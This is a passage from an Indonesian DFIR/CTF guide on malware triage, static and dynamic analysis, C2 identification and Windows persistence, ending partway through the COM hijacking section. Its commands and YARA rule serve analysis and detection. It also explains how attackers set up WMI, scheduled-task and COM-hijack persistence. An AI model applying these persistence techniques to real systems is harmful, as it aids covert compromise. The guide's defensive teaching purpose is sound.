## 📌 Daftar Isi — Bab 8

- [Bab 8 — Malware & Persistence Analysis](#bab-8--malware--persistence-analysis)
  - [8.1 Metodologi Analisis Malware](#81-metodologi-analisis-malware)
    - [8.1.1 Static vs Dynamic vs Behavioral Analysis](#811-static-vs-dynamic-vs-behavioral-analysis)
    - [8.1.2 Lingkungan Analisis Aman](#812-lingkungan-analisis-aman)
    - [8.1.3 Alur Triase Cepat (Order of Operations)](#813-alur-triase-cepat-order-of-operations)
  - [8.2 Static Analysis — Struktur PE File](#82-static-analysis--struktur-pe-file)
    - [8.2.1 Anatomi PE (DOS Header, NT Header, Section Table)](#821-anatomi-pe-dos-header-nt-header-section-table)
    - [8.2.2 Import/Export Table (IAT/EAT)](#822-importexport-table-iateat)
    - [8.2.3 Section Entropy & Indikasi Packing](#823-section-entropy--indikasi-packing)
    - [8.2.4 Resource Section — Extract Embedded Payload](#824-resource-section--extract-embedded-payload)
  - [8.3 Hashing, Fuzzy Hashing & Threat Intel](#83-hashing-fuzzy-hashing--threat-intel)
    - [8.3.1 MD5/SHA256 vs Imphash vs ssdeep](#831-md5sha256-vs-imphash-vs-ssdeep)
    - [8.3.2 VirusTotal / MalwareBazaar / Triage Lookup](#832-virustotal--malwarebazaar--triage-lookup)
    - [8.3.3 YARA — Signature-Based Detection](#833-yara--signature-based-detection)
  - [8.4 String & Config Extraction](#84-string--config-extraction)
    - [8.4.1 strings vs FLOSS](#841-strings-vs-floss)
    - [8.4.2 Base64/XOR Config Decoding](#842-base64xor-config-decoding)
    - [8.4.3 CyberChef Workflow Cepat](#843-cyberchef-workflow-cepat)
  - [8.5 Packer, Obfuscation & Script-Based Malware](#85-packer-obfuscation--script-based-malware)
    - [8.5.1 Signature Packer Umum](#851-signature-packer-umum)
    - [8.5.2 Manual Unpacking — Konsep OEP & Dump](#852-manual-unpacking--konsep-oep--dump)
    - [8.5.3 Script-Based Malware (AutoIt3, PowerShell, VBS/JS/HTA)](#853-script-based-malware-autoit3-powershell-vbsjshta)
  - [8.6 Dynamic & Behavioral Analysis](#86-dynamic--behavioral-analysis)
    - [8.6.1 Sandbox](#861-sandbox)
    - [8.6.2 Process Monitor (ProcMon)](#862-process-monitor-procmon)
    - [8.6.3 Process Explorer / Process Hacker](#863-process-explorer--process-hacker)
    - [8.6.4 Korelasi ke Network Capture](#864-korelasi-ke-network-capture)
  - [8.7 Rekonstruksi Infection Chain](#87-rekonstruksi-infection-chain)
    - [8.7.1 Model Umum: Delivery → Dropper → Loader → Payload → C2](#871-model-umum-delivery--dropper--loader--payload--c2)
    - [8.7.2 Timeline Korelasi Lintas-Artefak](#872-timeline-korelasi-lintas-artefak)
    - [8.7.3 Cyber Kill Chain untuk Disk Forensics](#873-cyber-kill-chain-untuk-disk-forensics)
  - [8.8 Identifikasi C2 & Network Indicator](#88-identifikasi-c2--network-indicator)
    - [8.8.1 Extract C2 dari Binary](#881-extract-c2-dari-binary)
    - [8.8.2 Korelasi DNS Artifact](#882-korelasi-dns-artifact)
    - [8.8.3 DGA (Domain Generation Algorithm)](#883-dga-domain-generation-algorithm)
    - [8.8.4 C2 via Layanan Legit (LOTS)](#884-c2-via-layanan-legit-lots)
  - [8.9 Persistence — Teknik yang Belum Dibahas](#89-persistence--teknik-yang-belum-dibahas)
    - [8.9.1 Scheduled Task At-Rest (System32\\Tasks)](#891-scheduled-task-at-rest-system32tasks)
    - [8.9.2 Startup Folder](#892-startup-folder)
    - [8.9.3 WMI Event Subscription](#893-wmi-event-subscription)
    - [8.9.4 COM Hijacking](#894-com-hijacking)
    - [8.9.5 AppInit_DLLs, AppCertDLLs & DLL Search Order Hijacking](#895-appinit_dlls-appcertdlls--dll-search-order-hijacking)
    - [8.9.6 Service DLL Hijacking](#896-service-dll-hijacking)
    - [8.9.7 BITS Jobs](#897-bits-jobs)
    - [8.9.8 LSA Security Package Persistence](#898-lsa-security-package-persistence)
    - [8.9.9 Browser & Office-Based Persistence](#899-browser--office-based-persistence)
    - [8.9.10 Application Shimming (Custom Shim Database)](#8910-application-shimming-custom-shim-database)
    - [8.9.11 Teknik Persistence Niche Lainnya](#8911-teknik-persistence-niche-lainnya)
    - [8.9.12 Autoruns — Enumerasi Persistence All-in-One](#8912-autoruns--enumerasi-persistence-all-in-one)
  - [8.10 Tabel Master Persistence (MITRE ATT&CK Mapping)](#810-tabel-master-persistence-mitre-attck-mapping)
  - [8.11 Process Injection & Evasion](#811-process-injection--evasion)
    - [8.11.1 DLL Injection, Process Hollowing, Process Doppelgänging](#8111-dll-injection-process-hollowing-process-doppelgnging)
    - [8.11.2 Korelasi Deteksi ke Bab 7](#8112-korelasi-deteksi-ke-bab-7)
    - [8.11.3 LOLBins (Living-off-the-Land Binaries)](#8113-lolbins-living-off-the-land-binaries)
  - [8.12 Anti-Analysis & Anti-Forensic oleh Malware](#812-anti-analysis--anti-forensic-oleh-malware)
    - [8.12.1 VM/Sandbox Detection Tricks](#8121-vmsandbox-detection-tricks)
    - [8.12.2 Timestomping & Log Clearing](#8122-timestomping--log-clearing)
    - [8.12.3 Fileless Malware](#8123-fileless-malware)
  - [8.13 Tabel Korelasi Cepat — Indikator Malware](#813-tabel-korelasi-cepat--indikator-malware)
  - [8.14 Ringkasan Command & Tools Cheat Sheet](#814-ringkasan-command--tools-cheat-sheet)
  - [8.15 Mini Case Study — Rekonstruksi Infection Chain AutoIt3-based](#815-mini-case-study--rekonstruksi-infection-chain-autoit3-based)

---

## Bab 8 — Malware & Persistence Analysis

> 💡 **Posisi Bab 8 di seri ini:** Bab 1-7 fokus ke *artefak* (di mana bukti tersimpan, bagaimana strukturnya). Bab 8 menyatukan semuanya dari sudut pandang **malware** — bagaimana ia masuk, jalan, bertahan, dan berkomunikasi — sekaligus menambahkan teknik yang belum tersentuh di bab manapun. Beberapa teknik persistence classic (Run/RunOnce, Services, IFEO) **sudah dibahas lengkap di Bab 3 §3.3.2, §3.4.2, §3.4.4** — di sini tidak diulang, cukup dirujuk balik. Bab 8 fokus ke persistence yang **belum** dibahas plus sisi malware analysis (static/dynamic) yang memang belum ada tempatnya di bab manapun sebelumnya.

### 8.1 Metodologi Analisis Malware

#### 8.1.1 Static vs Dynamic vs Behavioral Analysis

| Pendekatan | Definisi | Kapan Dipakai |
|---|---|---|
| **Static Analysis** | Analisa file tanpa mengeksekusinya — header, strings, hash, disassembly | Langkah pertama selalu, aman, cepat |
| **Dynamic Analysis** | Eksekusi sampel di lingkungan terkontrol, amati perilaku real-time | Setelah static tidak cukup (packed/obfuscated) |
| **Behavioral Analysis** | Fokus ke *efek* — file/registry/network yang berubah, bukan cara kerja internal | CTF/DFIR yang butuh IOC cepat, bukan reverse engineering penuh |

> ⚠️ **Miskonsepsi umum:** Static analysis bukan berarti "pasti aman". Sekadar membuka file di hex editor/PE viewer relatif aman, tapi disassembly otomatis oleh sebagian tool bisa memicu macro/script embedded. Tetap perlakukan sampel sebagai **live ammunition** — jangan double-click, jangan buka di mesin utama.

#### 8.1.2 Lingkungan Analisis Aman

* **Isolated VM** — snapshot sebelum eksekusi, revert setiap selesai satu sampel.
* **Network containment** — host-only/internal network, atau route ke INetSim/FakeNet-NG supaya malware "percaya" ia terhubung internet tanpa benar-benar keluar.
* **Hindari shared folder/clipboard** antara VM analisis dan host — banyak malware modern mendeteksi & meng-exploit shared clipboard.

```bash
# FakeNet-NG — simulasi service jaringan (DNS, HTTP, HTTPS) di VM analisis
fakenet.exe

# INetSim (Linux) — internet simulator untuk sandbox jaringan
inetsim
```

#### 8.1.3 Alur Triase Cepat (Order of Operations)

```
1. Hash file (MD5/SHA256) → cek reputasi dulu (§8.3.2) SEBELUM buka apapun
2. Static: PE header, imports, strings, entropy (§8.2, §8.4)
3. YARA scan (§8.3.3) — cocokkan dengan rule/family yang sudah dikenal
4. Kalau packed/obfuscated → identifikasi packer, unpack (§8.5)
5. Dynamic run di sandbox terisolasi (§8.6) — kalau static analysis mentok
6. Korelasikan hasil dengan artefak disk/registry/memory dari Bab 1-7
```

> 💡 **Tip CTF:** Untuk soal HTB Sherlock berbasis file statis (bukan live VM), langkah 1-4 biasanya **sudah cukup** menjawab pertanyaan (hash, C2, persistence mechanism). Langkah 5 (dynamic run) jarang bisa dilakukan di Sherlock karena kamu cuma dapat artefak, bukan sampel yang bisa dieksekusi ulang — dynamic analysis lebih relevan untuk soal reverse engineering/malware analysis murni.

---

### 8.2 Static Analysis — Struktur PE File

#### 8.2.1 Anatomi PE (DOS Header, NT Header, Section Table)

```
DOS Header (MZ signature)
  └── e_lfanew → offset ke NT Header

NT Header
  ├── Signature (PE\0\0)
  ├── File Header     → jumlah section, timestamp compile, characteristics
  └── Optional Header  → entry point, image base, subsystem, data directories

Section Table
  ├── .text    → kode executable
  ├── .data    → data ter-inisialisasi
  ├── .rdata   → data read-only (termasuk sering import table)
  └── .rsrc    → resource (icon, string table, embedded file)
```

> 💡 **Forensic value dari PE Timestamp:** Field `TimeDateStamp` di File Header **bisa dipalsukan dengan mudah** (attacker sering set ke tanggal lama supaya file "terlihat lawas"). Jangan jadikan satu-satunya bukti waktu kompilasi — cross-check dengan waktu file muncul di sistem (MFT §2.1.2, Prefetch §4.13).

```bash
# pefile (Python) — baca header PE secara terprogram
python3 -c "import pefile; pe = pefile.PE('sample.exe'); print(pe.FILE_HEADER.TimeDateStamp)"

# CFF Explorer / PEStudio — inspeksi GUI, lebih cepat untuk eksplorasi manual
```

#### 8.2.2 Import/Export Table (IAT/EAT)

Import table (IAT) mendaftar fungsi Windows API apa saja yang dipanggil binary — ini "sidik jari perilaku" paling cepat dibaca **tanpa** disassembly penuh.

| Pola Import | Indikasi |
|---|---|
| `VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread` | Process injection |
| `InternetOpen`, `WinHttpConnect`, `URLDownloadToFile` | Network/C2 communication |
| `RegSetValueEx`, `RegCreateKeyEx` | Modifikasi registry (persistence) |
| `CryptEncrypt`, `CryptAcquireContext` | Enkripsi (ransomware/config obfuscation) |
| `GetAsyncKeyState`, `SetWindowsHookEx` | Keylogging |
| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent` | Anti-debugging |
| Import table **sangat pendek/kosong** | Kemungkinan packed — API di-resolve manual saat runtime |

> ⚠️ **Tip CTF:** Import table pendek/kosong bukan berarti "binary sederhana" — justru sebaliknya, sering jadi indikasi packing/obfuscation (§8.5). Baca §8.2.3 (entropy) untuk konfirmasi.

#### 8.2.3 Section Entropy & Indikasi Packing

Entropy tinggi (mendekati 8.0 dari skala 0-8) pada sebuah section mengindikasikan data terkompresi/terenkripsi — ciri khas packer.

| Entropy | Interpretasi |
|---|---|
| 0 – 5 | Kode/data normal, tidak dikompresi |
| 5 – 6.5 | Kemungkinan mixed content atau kompresi ringan |
| 6.5 – 8 | Sangat mungkin packed/encrypted (UPX, custom crypter) |

```bash
# PEStudio / CFF Explorer menampilkan entropy per section otomatis di panel Sections
# Atau manual pakai Python
python3 -c "
import pefile, math
pe = pefile.PE('sample.exe')
for s in pe.sections:
    print(s.Name, s.get_entropy())
"
```

#### 8.2.4 Resource Section — Extract Embedded Payload

`.rsrc` sering dipakai attacker untuk menyembunyikan payload stage-2 (executable lain, config terenkripsi, gambar yang sebetulnya berisi data via steganografi).

```bash
# Resource Hacker — GUI, extract semua resource dari PE
# atau via Python
python3 -c "
import pefile
pe = pefile.PE('sample.exe')
pe.parse_data_directories()
for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
    print(entry.name, entry.struct)
"
```

> 💡 **Tip CTF:** Kalau ukuran file jauh lebih besar dari yang "wajar" untuk fungsinya (mis. installer 50MB padahal cuma dropper kecil), curigai payload stage-2 tersembunyi di `.rsrc` atau di-*append* setelah akhir PE resmi (overlay data) — cek dengan `pe.get_overlay_data_start_offset()`.

---

### 8.3 Hashing, Fuzzy Hashing & Threat Intel

#### 8.3.1 MD5/SHA256 vs Imphash vs ssdeep

| Jenis Hash | Fungsi | Catatan |
|---|---|---|
| MD5/SHA256 | Identitas exact file | Berubah total kalau 1 byte saja beda — tidak berguna untuk varian |
| **Imphash** | Hash dari urutan+nama fungsi di Import Table | Sample dari keluarga/builder yang sama sering punya imphash identik walau hash file beda |
| **ssdeep** (fuzzy hash) | Deteksi kemiripan struktural walau ada modifikasi | Berguna cari "varian mirip" di koleksi sampel |

```bash
sha256sum sample.exe
python3 -c "import pefile; print(pefile.PE('sample.exe').get_imphash())"
ssdeep sample.exe
ssdeep -m known_samples.txt sample.exe   # bandingkan similarity terhadap database
```

#### 8.3.2 VirusTotal / MalwareBazaar / Triage Lookup

```bash
# Cek hash tanpa upload file (privacy-safe, cukup query hash)
curl -s "https://www.virustotal.com/api/v3/files/<sha256>" -H "x-apikey: <API_KEY>"

# MalwareBazaar — cari sampel & metadata berdasarkan hash
curl -s -d "query=get_info&hash=<sha256>" https://mb-api.abuse.ch/api/v1/
```

> 💡 **Tip CTF:** Kalau lingkungan soal tidak ada akses internet, cek dulu apakah sudah ada rule YARA/IOC yang disediakan di paket soal sebelum coba lookup online — banyak CTF sengaja isolated network.

#### 8.3.3 YARA — Signature-Based Detection

```yara
rule Suspicious_AutoIt_Dropper
{
    meta:
        description = "Deteksi dropper AutoIt3 dengan indikasi C2 hardcoded"
    strings:
        $autoit_magic = "AU3!EA06" // AutoIt3 compiled script marker
        $http = /https?:\/\/[a-zA-Z0-9.\-]+/ ascii
    condition:
        $autoit_magic and $http
}
```

```bash
yara -r ruleset.yar sample.exe
yara -r ruleset.yar C:\suspicious_folder\   # scan rekursif satu folder
```

> 💡 **Cross-reference:** YARA scan juga bisa dijalankan langsung terhadap RAM dump lewat Volatility plugin `yarascan`/`vadyarascan` — sudah dibahas di **Bab 7 §7.4.5**.

---

### 8.4 String & Config Extraction

#### 8.4.1 strings vs FLOSS

`strings` biasa hanya membaca ASCII/UTF-16 literal — gagal total kalau string di-encode/di-obfuscate (yang sangat umum di malware modern). **FLOSS** (FireEye/Mandiant) mendekode stack strings, XOR-encoded strings, dan string yang dibangun runtime.

```bash
strings -n 6 sample.exe
strings -el sample.exe   # UTF-16LE (umum di binary Windows)

floss sample.exe                     # full analysis, semua teknik deobfuscation
floss --only static sample.exe       # lebih cepat, skip emulasi stack string
```

#### 8.4.2 Base64/XOR Config Decoding

Config C2 (domain, port, key) sering disimpan ter-encode sederhana di dalam binary.

```bash
# Deteksi pola base64 mencurigakan di antara hasil strings
strings sample.exe | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'

# Brute-force single-byte XOR terhadap blob tersangka (kalau base64 gagal decode)
python3 -c "
data = bytes.fromhex('...')
for k in range(256):
    out = bytes([b ^ k for b in data])
    if b'http' in out:
        print(k, out)
"
```

#### 8.4.3 CyberChef Workflow Cepat

Untuk data yang di-layer (mis. Base64 → XOR → Gzip), CyberChef ("Magic" wand) jauh lebih cepat dibanding scripting manual satu-satu.

> 💡 **Tip CTF:** Kalau soal kasih blob config panjang tanpa petunjuk encoding, coba operasi "Magic" CyberChef dulu sebelum menebak manual — sering langsung mengenali kombinasi Base64+XOR/Gzip otomatis.

---

### 8.5 Packer, Obfuscation & Script-Based Malware

#### 8.5.1 Signature Packer Umum

| Packer | Ciri Khas | Tools Deteksi |
|---|---|---|
| UPX | Section name `UPX0`/`UPX1`, mudah di-unpack (`upx -d`) | `upx -d sample.exe` (kalau bukan modified header) |
| Themida/VMProtect | Entropy sangat tinggi, banyak anti-debug, section non-standar | Detect It Easy (DIE) |
| .NET obfuscator (ConfuserEx, dst) | Nama class/method acak, control flow flattening | de4dot, dnSpy |
| Custom crypter | Tidak match signature manapun, stub loader kecil + payload berentropi tinggi | Manual: cek entry point section, entropy per section |

```bash
# Detect It Easy (DIE) — deteksi packer/compiler/protector otomatis
diec sample.exe

# UPX — coba unpack langsung (banyak sampel malware pakai UPX apa adanya, tanpa modifikasi header)
upx -d sample.exe -o sample_unpacked.exe
```

#### 8.5.2 Manual Unpacking — Konsep OEP & Dump

```
1. Jalankan sampel di debugger (x64dbg) dengan breakpoint di API alokasi memori umum
   (VirtualAlloc, VirtualProtect) — packer biasanya alokasi memori baru untuk decompress payload

2. Set breakpoint di akhir writable memory region tsb, run sampai packer selesai "membongkar" diri

3. Cari OEP (Original Entry Point) — biasanya lompatan besar (JMP) ke alamat baru
   setelah proses unpacking packer selesai

4. Dump memory process pada titik OEP (Scylla/x64dbg plugin)

5. Fix Import Address Table (IAT) hasil dump — packer sering merusak IAT asli,
   perlu direkonstruksi supaya dumped file bisa dianalisa statis lagi
```

> ⚠️ **Batasan:** Manual unpacking adalah topik reverse engineering tersendiri yang dalam — bagian ini hanya kerangka konsep. Untuk kebutuhan CTF/DFIR sehari-hari, cukup fokus ke identifikasi packer + coba tool otomatis (UPX, DIE) dulu sebelum masuk manual unpacking penuh.

#### 8.5.3 Script-Based Malware (AutoIt3, PowerShell, VBS/JS/HTA)

| Jenis | Ciri Khas | Ekstraksi |
|---|---|---|
| **AutoIt3 compiled (.exe)** | Marker `AU3!EA06` di dalam binary, sering dipakai sebagai wrapper dropper | `Exe2Aut` / `AutoIt-Ripper` untuk decompile jadi script asli |
| PowerShell | Base64-encoded `-EncodedCommand`, sering multi-layer | Decode base64 → cek Script Block Logging Event 4104 (**Bab 4 §4.5.3**) |
| VBS/JS (WSH) | Sering sebagai stage awal (phishing attachment) | Deobfuscate manual/CyberChef, cari `WScript.Shell`, `ActiveXObject` |
| HTA | Mixed HTML+VBScript/JScript, dieksekusi via `mshta.exe` | Sama seperti VBS/JS, cek `mshta.exe` command line di Prefetch/EVTX 4688 |

```bash
# Exe2Aut — decompile AutoIt3 executable jadi source .au3
Exe2Aut.exe sample.exe

# Cek command line lengkap PowerShell/mshta lewat Sysmon Event 1 / Security 4688
# (Bab 4 §4.3.4 & §4.6.1)
```

> 💡 **Cross-reference (kasus nyata):** Pola infection chain berbasis AutoIt3 seperti ini persis dengan yang dibahas di mini case study **§8.15** — fake installer → dropper AutoIt3 → payload final dengan C2 hardcoded.

---

### 8.6 Dynamic & Behavioral Analysis

#### 8.6.1 Sandbox

| Sandbox | Karakteristik |
|---|---|
| ANY.RUN | Interaktif (bisa klik manual selama eksekusi), online, laporan visual |
| Cuckoo Sandbox | Self-hosted, bisa dikustomisasi mendalam, cocok untuk analisis privat/sensitif |
| Hybrid Analysis | Kombinasi static+dynamic report, gratis untuk lookup cepat |

> ⚠️ **Nilai forensik terbatas:** Sandbox publik (upload-based) berisiko membocorkan sampel ke pihak lain/attacker (kalau sampel unik & attacker memantau submission). Untuk kasus DFIR nyata dengan sensitivitas tinggi, selalu prioritaskan sandbox self-hosted/offline.

#### 8.6.2 Process Monitor (ProcMon)

Merekam real-time semua aktivitas filesystem, registry, dan process/thread di level API call — granularitas paling detail untuk behavioral analysis di Windows live.

```
Filter yang berguna:
- Process Name is sample.exe
- Operation begins with "Reg" → semua aktivitas registry (persistence check)
- Operation is "WriteFile" → file yang di-drop/dimodifikasi
- Path contains "AppData\Local\Temp" → staging area umum malware
```

#### 8.6.3 Process Explorer / Process Hacker

Lihat process tree live, DLL yang di-load, handle terbuka, dan yang paling penting: **verifikasi digital signature** tiap proses berjalan — proses sistem yang "Unverified" atau berjalan dari path aneh (`AppData`, `Temp`) adalah red flag instan.

#### 8.6.4 Korelasi ke Network Capture

```bash
# Wireshark / tshark — capture traffic selama dynamic analysis
tshark -i eth0 -w capture.pcapng

# Filter cepat: DNS query + HTTP request selama eksekusi sampel
tshark -r capture.pcapng -Y "dns or http"
```

> 💡 **Tip CTF:** Kalau soal menyediakan file `.pcapng` bersamaan dengan sampel/artefak disk, selalu cek dulu apakah domain/IP yang muncul di traffic **match** dengan string/config yang diekstrak dari binary (§8.4, §8.8.1) — korelasi dua sumber ini biasanya jadi jawaban final soal C2 identification.

---

### 8.7 Rekonstruksi Infection Chain

#### 8.7.1 Model Umum: Delivery → Dropper → Loader → Payload → C2

```
Delivery       → phishing attachment, fake installer, drive-by download, USB
   ↓
Dropper        → executable/script kecil, tugasnya cuma "menaruh" komponen berikutnya
   ↓
Loader         → decode/decrypt & load payload sesungguhnya ke memory (sering fileless)
   ↓
Payload        → malware inti (infostealer, ransomware, RAT, dst)
   ↓
Persistence    → pasang mekanisme supaya bertahan lewat reboot (§8.9, §3.3-3.4)
   ↓
C2             → komunikasi keluar untuk command & exfiltration (§8.8)
```

#### 8.7.2 Timeline Korelasi Lintas-Artefak

Rekonstruksi infection chain hampir selalu butuh menggabungkan artefak dari banyak bab sekaligus:

| Tahap | Artefak yang Dicek | Bab |
|---|---|---|
| Delivery (file muncul) | `$MFT` Created time, LNK/Jump List kalau via email attachment | §2.1.2, §5.3, §5.4 |
| Eksekusi dropper | Prefetch, Amcache, ShimCache, EVTX 4688/Sysmon 1 | §4.13, §3.8, §3.4.3, §4.3.4 |
| Loader/payload aktif | Memory (malfind, ldrmodules), Sysmon 7/8/10 | §7.7, §4.6.3-4.6.4 |
| Persistence terpasang | Registry Run/Services/IFEO, Scheduled Task, WMI (§8.9) | §3.3.2, §3.4.2, §3.4.4, §8.9 |
| C2 komunikasi | Sysmon 3/22, browser DNS-over-HTTPS artifact | §4.6.2, §4.6.7, §6.10 |
| Anti-forensic attacker | Log cleared (1102), VSS deleted, timestomping | §4.9, §5.1.8, §2.1.3 |

> 💡 **Prinsip:** Jangan cari "satu bukti pamungkas" — infection chain yang solid dibangun dari korelasi timestamp lintas-artefak yang **saling menguatkan**, persis seperti workflow di mini case study **Bab 2 §2.5** tapi cakupannya sekarang lintas-bab penuh.

#### 8.7.3 Cyber Kill Chain untuk Disk Forensics

| Fase Kill Chain | Pertanyaan Investigasi | Artefak Kunci |
|---|---|---|
| Reconnaissance | Bagaimana attacker tahu target ini? | (jarang tersisa di disk — biasanya dari OSINT/log eksternal) |
| Weaponization | Apa tool/builder yang dipakai? | Metadata PE, imphash, YARA family match |
| Delivery | Lewat jalur apa masuk? | Email attachment (LNK/Jump List), USB (USBSTOR), web download (browser history §6.2) |
| Exploitation/Installation | Bagaimana dropper jalan pertama kali? | Prefetch, EVTX 4688, Amcache |
| C2 | Kemana ia "memanggil pulang"? | §8.8 |
| Actions on Objectives | Apa yang benar-benar dilakukan attacker? | File exfil (LNK/UsnJrnl), credential dump (§3.5), lateral movement (§4.3.7) |

---

### 8.8 Identifikasi C2 & Network Indicator

#### 8.8.1 Extract C2 dari Binary

```bash
# Kombinasi paling efektif: FLOSS untuk deobfuscate string, lalu filter pola URL/IP
floss sample.exe | grep -E "https?://|([0-9]{1,3}\.){3}[0-9]{1,3}"

# Kalau config di-encrypt, cari fungsi dekripsi di dekat pemanggilan WinHttp/InternetOpen (§8.2.2)
# lalu emulasi manual dekripsinya (custom XOR/RC4/AES key sering hardcoded di dekat situ)
```

#### 8.8.2 Korelasi DNS Artifact

```bash
# Sysmon Event ID 22 (DNS Query) — Bab 4 §4.6.7
EvtxECmd.exe -f Microsoft-Windows-Sysmon%4Operational.evtx --csv . --csvf sysmon_dns.csv
# filter QueryName yang tidak familiar / baru muncul di window waktu infection
```

#### 8.8.3 DGA (Domain Generation Algorithm)

Ciri domain hasil DGA: string acak tanpa makna linguistik (`xk4jd8f.com`), TLD sering berganti-ganti, dan volume query DNS NXDOMAIN tinggi (banyak domain "dicoba" sebelum menemukan yang aktif).

> 💡 **Tip CTF:** Kalau melihat puluhan-ratusan query DNS gagal (NXDOMAIN) beruntun sebelum satu domain berhasil resolve, itu pola khas DGA — domain yang berhasil resolve itulah C2 aktif yang harus dilaporkan.

#### 8.8.4 C2 via Layanan Legit (LOTS)

Malware modern makin sering pakai layanan legitimate sebagai C2 channel untuk menghindari deteksi berbasis reputasi domain — Discord webhook, Telegram Bot API, Pastebin, GitHub Gist, Google Forms/Sheets.

> ⚠️ **Kenapa penting dikenali:** Traffic ke domain seperti `discord.com` atau `api.telegram.org` **tidak akan** ditandai mencurigakan oleh filter reputasi standar. Fokus pemeriksaan bergeser dari "domain apa" ke "pola request apa" (endpoint spesifik, header/payload di dalam request HTTPS-nya) — sering hanya bisa dikonfirmasi lewat isi string/config binary (§8.8.1), bukan cuma dari nama domain di traffic.

---

### 8.9 Persistence — Teknik yang Belum Dibahas

> 📖 **Rujukan balik:** Run/RunOnce, Services, dan Image File Execution Options sudah dibahas lengkap dengan registry path, nilai forensik, dan tip CTF-nya di **Bab 3 §3.3.2, §3.4.2, §3.4.4**. Bagian ini melengkapi dengan teknik yang belum tersentuh di bab manapun.

#### 8.9.1 Scheduled Task At-Rest (System32\Tasks)

Selain jejak di Event Log (Event ID 4698-4702, **Bab 4 §4.3.9**), definisi task itu sendiri tersimpan sebagai file XML di disk — berguna kalau EVTX sudah tidak tersedia (log cleared/rotated) tapi task-nya masih aktif.

```
C:\Windows\System32\Tasks\<NamaTask>          ← file XML tanpa ekstensi, isi definisi lengkap task
C:\Windows\System32\Tasks\Microsoft\Windows\  ← subfolder task bawaan Windows
```

```bash
# Baca langsung isi XML task mencurigakan
type "C:\Windows\System32\Tasks\UpdateCheck"

# Field kunci di dalam XML: <Command>, <Arguments>, <Triggers> (kapan dijalankan), <Author>
```

> 💡 **Tip CTF:** Task yang dibuat attacker sering menyamar dengan nama generic ("UpdateCheck", "GoogleUpdateTaskMachine" tapi salah ketik/salah path) — bandingkan `<Command>` (path executable) dengan lokasi resmi vendor asli, dan cek `Author` yang seharusnya `NT AUTHORITY\SYSTEM` untuk task bawaan.

#### 8.9.2 Startup Folder

```
C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\   ← per-user
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\                     ← all users
```

Teknik persistence paling sederhana — taruh shortcut (`.lnk`, bisa dikorelasikan dengan **Bab 5 §5.3**) atau executable langsung di folder ini, otomatis jalan tiap user login.

#### 8.9.3 WMI Event Subscription

Persistence "fileless" klasik — tidak meninggalkan file executable baru, cukup 3 komponen WMI yang saling terhubung:

```
__EventFilter        ← kondisi pemicu (mis. "setiap kali proses baru dibuat")
__EventConsumer       ← aksi yang dijalankan (CommandLineEventConsumer = jalankan command)
__FilterToConsumerBinding  ← penghubung filter dan consumer
```

```bash
# Cek WMI subscription mencurigakan di live system
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

# Offline: parsing OBJECTS.DATA di dalam repository WMI
# C:\Windows\System32\wbem\Repository\OBJECTS.DATA — butuh tool khusus (PyWMIPersistenceFinder)
python3 PyWMIPersistenceFinder.py OBJECTS.DATA
```

**4 jenis `__EventConsumer` yang perlu dikenali** (semakin ke bawah semakin jarang tapi semakin berbahaya):

| Jenis Consumer | Aksi | Catatan Forensik |
|---|---|---|
| `CommandLineEventConsumer` | Jalankan command/executable langsung | Paling umum dipakai attacker — field `CommandLineTemplate` berisi payload |
| `ActiveScriptEventConsumer` | Jalankan VBScript/JScript inline | Field `ScriptText` — payload bisa langsung dibaca dari sini, tidak perlu decode |
| `NTEventLogEventConsumer` | Tulis entry custom ke Event Log | Jarang untuk payload, lebih ke logging/covert channel |
| `SMTPEventConsumer` | Kirim email | Jarang; kalau ada, indikasi kuat data exfiltration bukan sekadar persistence |

> 💡 **Timestamp forensik:** Setiap objek WMI (`__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding`) punya properti internal yang mencatat **kapan subscription dibuat** — `PyWMIPersistenceFinder` maupun `python-cim`/`dfir-wmi` menampilkannya sebagai bagian output. Korelasikan waktu ini dengan Prefetch/EVTX 4688 dari proses yang membuat subscription (biasanya `wmic.exe`, `powershell.exe`, atau `mofcomp.exe`) untuk menentukan **kapan persistence dipasang** — sering jadi jawaban kunci soal Sherlock bertema WMI.

> ⚠️ **Kenapa berbahaya:** Karena tidak ada file baru yang dieksekusi langsung (payload bisa berupa PowerShell inline di dalam `CommandLineEventConsumer`), teknik ini sering lolos dari deteksi berbasis Prefetch/Amcache — cross-check ke Sysmon Event ID 19/20/21 (WMI Activity) kalau tersedia. Event ID 19 = `WmiCreateEvent` (filter dibuat), 20 = consumer dibuat, 21 = binding dibuat — ketiganya biasanya muncul berurutan dalam hitungan detik saat attacker memasang subscription.

#### 8.9.4 COM Hijacking

Windows me-resolve CLSID (Class ID) COM object lewat registry — attacker override entry `InprocServer32` supaya path-nya menunjuk ke DLL malware, sehingga tiap kali aplikasi legit memanggil COM object tersebut, DLL attacker yang ter-load.

```
HKCU\Software\Classes\CLSID\<CLSID>\InprocServer32\(Default)  ← path DLL yang di-hijack
```

> 💡 **Kenapa dipilih attacker:** HKCU (per-user) tidak butuh privilege admin untuk ditulis, dan CLSID yang di-hijack biasanya milik komponen yang sering dipanggil aplikasi umum (Explorer, IE), sehingga eksekusi ulang terjadi otomatis tanpa trigger tambahan.

**Cara deteksi — kenapa HKCU jadi red flag:** Windows secara desain hanya mendefinisikan sebagian besar CLSID di `HKLM\Software\Classes\CLSID\...` (hive mesin, butuh admin). Kalau ada `CLSID` yang sama persis muncul **juga** di `HKCU\Software\Classes\CLSID\...` milik satu user tertentu, itu **anomali** — Windows resolusi COM akan mengecek HKCU dulu sebelum HKLM, jadi entry HKCU inilah yang menang dan dieksekusi.

```bash
# RegRipper plugin khusus (offline, dari hive NTUSER.DAT)
rip.pl -r NTUSER.DAT -p comhijack

# Manual: bandingkan CLSID yang ada di HKCU vs baseline HKLM
# Kalau satu CLSID punya entry di HKCU DAN HKLM dengan path DLL BERBEDA → indikasi kuat hijack
```

